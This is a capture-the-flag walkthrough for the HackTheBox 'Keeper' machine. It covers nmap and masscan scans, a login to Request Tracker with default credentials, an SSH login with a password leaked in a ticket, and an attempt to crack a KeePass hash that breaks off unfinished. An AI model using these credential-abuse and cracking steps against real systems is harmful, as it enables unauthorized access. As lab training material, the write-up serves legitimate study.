# Keeper

# User Flag

## NMAP Enumeration

Masscan UDP/TCP Port Scan:

```bash
sudo masscan -p1-65535,U:1-65535 10.10.11.227 --rate=1000 -e tun0

Discovered open port 80/tcp on 10.10.11.227                                    
Discovered open port 22/tcp on 10.10.11.227
```

NMAP All Open ports:

```bash
sudo nmap -T5 --open -sS -vvv --min-rate=300 --max-retries=3 -p- -oN nmap-report-all-open-ports

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

All Ports (Filtered, Closed, etc.)

```bash
sudo nmap -T5 -sS -vvv --min-rate=100 --max-retries=3 -p- -oN nmap-report-all-ports 10.10.11.227

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Port Service Scan:

```bash
nmap -sV -sC -Pn -v -oN nmap-report-service-scan 10.10.11.227 -p 22,80

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration (Port 80)

Navigating to the website hosted on port 80 provides the following text:

```bash
To raise an IT support ticket, please visit tickets.keeper.htb/rt/
```

Edited `/etc/hosts` file and added entries the domain and subdomain observed:

```bash
10.10.11.227    keeper.htb
10.10.11.227    tickets.keeper.htb
```

New login webpage is returned when navigating to `http://tickets.keeper.htb/rt/`:

![Login Page](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Keeper/Images/Login%20Page.png)

Default credentials `root:password` were found in this [link](https://wiki.gentoo.org/wiki/Request_Tracker#:~:text=%2D%2Daction%20comment-,Log%20in,root%20%2C%20and%20password%20is%20password%20.) that work and I am able to login.

![Successful Login](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Keeper/Images/Successful%20Login.png)

Under Admin tab, can see two users are enabled.

![Enabled Users](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Keeper/Images/Users%20Enabled.png)

Looking through the ticketing system, was able to find the user `lnorgaard@keeper.htb` and a comment with a default passowrd `Welcome2023!`.

![Default Credentials](https://github.com/timmccann222/Public-Writeups-Library/blob/main/HackTheBox/Linux%20Machines/Keeper/Images/Default%20Password.png)

Was then able to SSH into target machine using credentials `lnorgaard:Welcome2023!`:

```bash
ssh lnorgaard@10.10.11.227

lnorgaard@keeper:~$ id
uid=1000(lnorgaard) gid=1000(lnorgaard) groups=1000(lnorgaard)
```

Recovered user.txt flag:

```bash
lnorgaard@keeper:~$ cat user.txt
71ba772bc110ce065983.........
```

# Root Flag

Found a file titled `RT30000.zip` and copied it back to my local machine.

```bash
scp lnorgaard@10.10.11.227:/home/lnorgaard/RT30000.zip .
```

Unzipping the file provides two files:

```bash
-rwxr-x---  1 kali kali 253395188 May 24  2023 KeePassDumpFull.dmp
-rwxr-x---  1 kali kali      3630 May 24  2023 passcodes.kdbx
```

Used `keepass2john` command to get hash:

```bash
keepass2john passcodes.kdbx 
passcodes:$keepass$*2*60000*0*5d7b4747e5a278d572fb0a66fe187ae5d74a0e2f56a2aaaf4c4f2b8ca342597d*5b7ec1cf6889266a388abe398d7990a294bf2a581156f7a7452b4074479bdea7*08500fa5a52622ab89b0addfedd5a05c*411593ef0846fc1bb3db4f9bab515b42e58ade0c25096d15f090b0fe10161125*a4842b416f14723513c5fb704a2f49024a70818e786f07e68e82a6d3d7cdbcdc
```

Tried to crack hash with `hashcat` but didn't work:

```bash
hashcat64.exe -m 13400 -a 0 hash.txt rockyou.txt -o cracked.txt
```












